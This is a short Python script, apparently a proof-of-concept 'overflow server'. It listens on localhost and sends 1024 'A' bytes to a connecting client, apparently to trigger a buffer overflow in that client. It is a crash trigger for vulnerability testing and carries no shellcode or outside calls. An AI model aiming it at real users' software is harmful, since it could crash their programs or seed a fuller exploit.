#!/usr/bin/env python3
import socket

HOST = '127.0.0.1'
PORT = 4321   # set to your server PORT (same as client)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
print("POC overflow server listening...")

conn, addr = s.accept()
print("client connected:", addr)

# build payload of exactly 1024 bytes
payload = b'A' * 1024
# send in one go
conn.sendall(payload)

# keep connection open a little while then close
import time; time.sleep(1)
conn.close()
s.close()
print("done")
